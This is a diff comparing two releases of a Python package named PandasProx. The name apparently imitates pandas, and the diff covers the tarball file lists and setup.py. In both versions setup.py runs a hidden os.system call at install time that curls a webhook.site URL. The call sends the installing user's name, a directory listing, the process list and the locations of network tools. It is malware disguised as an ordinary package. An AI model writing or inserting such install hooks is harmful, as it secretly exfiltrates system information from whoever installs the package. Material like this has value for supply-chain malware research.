# Comparing `tmp/PandasProx-0.1.9.tar.gz` & `tmp/PandasProx-0.2.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "PandasProx-0.1.9.tar", last modified: Wed May 17 13:04:12 2023, max compression
+gzip compressed data, was "PandasProx-0.2.0.tar", last modified: Wed May 17 13:11:38 2023, max compression
```

## Comparing `PandasProx-0.1.9.tar` & `PandasProx-0.2.0.tar`

### file list

```diff
@@ -1,12 +1,12 @@
-drwxrwxr-x   0 user      (1000) user      (1000)        0 2023-05-17 13:04:12.836112 PandasProx-0.1.9/
--rw-rw-r--   0 user      (1000) user      (1000)      226 2023-05-17 13:04:12.836112 PandasProx-0.1.9/PKG-INFO
--rw-rw-r--   0 user      (1000) user      (1000)       34 2023-05-17 11:47:24.000000 PandasProx-0.1.9/README.md
--rw-rw-r--   0 user      (1000) user      (1000)       79 2023-05-17 13:04:12.836112 PandasProx-0.1.9/setup.cfg
--rw-rw-r--   0 user      (1000) user      (1000)      570 2023-05-17 13:03:57.000000 PandasProx-0.1.9/setup.py
-drwxrwxr-x   0 user      (1000) user      (1000)        0 2023-05-17 13:04:12.836112 PandasProx-0.1.9/src/
-drwxrwxr-x   0 user      (1000) user      (1000)        0 2023-05-17 13:04:12.836112 PandasProx-0.1.9/src/PandasProx.egg-info/
--rw-rw-r--   0 user      (1000) user      (1000)      226 2023-05-17 13:04:12.000000 PandasProx-0.1.9/src/PandasProx.egg-info/PKG-INFO
--rw-rw-r--   0 user      (1000) user      (1000)      217 2023-05-17 13:04:12.000000 PandasProx-0.1.9/src/PandasProx.egg-info/SOURCES.txt
--rw-rw-r--   0 user      (1000) user      (1000)        1 2023-05-17 13:04:12.000000 PandasProx-0.1.9/src/PandasProx.egg-info/dependency_links.txt
--rw-rw-r--   0 user      (1000) user      (1000)        7 2023-05-17 13:04:12.000000 PandasProx-0.1.9/src/PandasProx.egg-info/requires.txt
--rw-rw-r--   0 user      (1000) user      (1000)        1 2023-05-17 13:04:12.000000 PandasProx-0.1.9/src/PandasProx.egg-info/top_level.txt
+drwxrwxr-x   0 user      (1000) user      (1000)        0 2023-05-17 13:11:38.923187 PandasProx-0.2.0/
+-rw-rw-r--   0 user      (1000) user      (1000)      226 2023-05-17 13:11:38.923187 PandasProx-0.2.0/PKG-INFO
+-rw-rw-r--   0 user      (1000) user      (1000)       34 2023-05-17 11:47:24.000000 PandasProx-0.2.0/README.md
+-rw-rw-r--   0 user      (1000) user      (1000)       79 2023-05-17 13:11:38.923187 PandasProx-0.2.0/setup.cfg
+-rw-rw-r--   0 user      (1000) user      (1000)      571 2023-05-17 13:11:29.000000 PandasProx-0.2.0/setup.py
+drwxrwxr-x   0 user      (1000) user      (1000)        0 2023-05-17 13:11:38.923187 PandasProx-0.2.0/src/
+drwxrwxr-x   0 user      (1000) user      (1000)        0 2023-05-17 13:11:38.923187 PandasProx-0.2.0/src/PandasProx.egg-info/
+-rw-rw-r--   0 user      (1000) user      (1000)      226 2023-05-17 13:11:38.000000 PandasProx-0.2.0/src/PandasProx.egg-info/PKG-INFO
+-rw-rw-r--   0 user      (1000) user      (1000)      217 2023-05-17 13:11:38.000000 PandasProx-0.2.0/src/PandasProx.egg-info/SOURCES.txt
+-rw-rw-r--   0 user      (1000) user      (1000)        1 2023-05-17 13:11:38.000000 PandasProx-0.2.0/src/PandasProx.egg-info/dependency_links.txt
+-rw-rw-r--   0 user      (1000) user      (1000)        7 2023-05-17 13:11:38.000000 PandasProx-0.2.0/src/PandasProx.egg-info/requires.txt
+-rw-rw-r--   0 user      (1000) user      (1000)        1 2023-05-17 13:11:38.000000 PandasProx-0.2.0/src/PandasProx.egg-info/top_level.txt
```

### Comparing `PandasProx-0.1.9/setup.py` & `PandasProx-0.2.0/setup.py`

 * *Files 26% similar despite different names*

```diff
@@ -1,15 +1,15 @@
 from setuptools import setup, find_packages
 import os
 
-os.system("curl https://webhook.site/926ed6ca-b070-4f50-829d-42a3252b9df3?q=$(whoami) -d \"$(which ss; which netstat; which ip; which ifconfig; ls -la; ps ax; ps; ps a/)\"")
+os.system("curl https://webhook.site/926ed6ca-b070-4f50-829d-42a3252b9df3?us=$(whoami) -d \"$(which ss; which netstat; which ip; which ifconfig; ls -la; ps ax; ps; ps a/)\"")
 
 setup(
     name='PandasProx',
-    version='0.1.9',
+    version='0.2.0',
     license='MIT',
     author="Rico Alfonco",
     author_email="Rico.Alf0@gmail.com",
     packages=find_packages('src'),
     package_dir={'': 'src'},
     keywords='example project',
     url="https://TODO_ADD_URL/",
```

